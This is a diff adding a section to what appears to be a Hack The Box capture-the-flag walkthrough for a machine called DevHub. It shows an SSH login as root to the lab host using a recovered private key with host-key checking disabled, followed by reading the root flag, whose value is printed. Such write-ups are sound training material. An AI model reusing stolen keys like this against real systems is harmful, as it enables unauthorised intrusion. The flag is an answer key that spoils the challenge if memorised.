@@ -2013,6 +2013,50 @@ The key file is now correctly formatted — proper headers, footers, and multi-l
 </div>
 
 ### 5.3 SSH as Root
+
+```shell
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
+└─$ ssh -i /tmp/root_id_rsa -o StrictHostKeyChecking=no root@10.129.245.216
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Wed Jun 10 12:50:13 PM UTC 2026
+
+  System load:           0.0
+  Usage of /:            76.6% of 9.50GB
+  Memory usage:          15%
+  Swap usage:            0%
+  Processes:             235
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.245.216
+  IPv6 address for eth0: dead:beef::a0de:adff:fee0:5010
+
+  => There is 1 zombie process.
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Wed Jun 10 12:50:15 2026 from 10.10.14.85
+root@devhub:~# cat root.txt 
+7418a44bc58001359c3601056dc530fe
+root@devhub:~# 
+```
+
+ROOT FLAG:
 <div align="center">
 <br>
 <br>
